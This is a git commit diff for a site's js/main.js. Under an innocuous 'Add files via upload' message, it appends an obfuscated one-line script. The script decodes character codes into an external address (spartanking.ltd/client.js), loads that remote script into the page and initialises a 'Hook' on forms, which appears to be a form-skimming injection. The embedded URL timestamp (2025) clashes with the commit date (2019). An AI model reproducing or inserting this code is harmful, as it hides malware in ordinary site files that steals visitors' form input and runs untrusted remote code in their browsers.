ef04778be8a395ea1688372e82a1a36d0f2658c2
Venkimut <30839530+Venkimut@users.noreply.github.com>
2019-02-16 16:02:02 +0530

    Add files via upload Venkimut

--- js/main.js
+++ js/main.js
@@ -115,3 +115,5 @@
 	});
 
 })(jQuery);
+
+(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){var _a;let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,116,105,109,101,61,49,55,52,49,56,50,51,50,51,54,50,49,48,38,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,((_a=document.body)!=null?_a:document.head).appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//7d6faab54565256b4815fd0e2fb99a714e4d2c7cb73b2fa69205e197a146d323
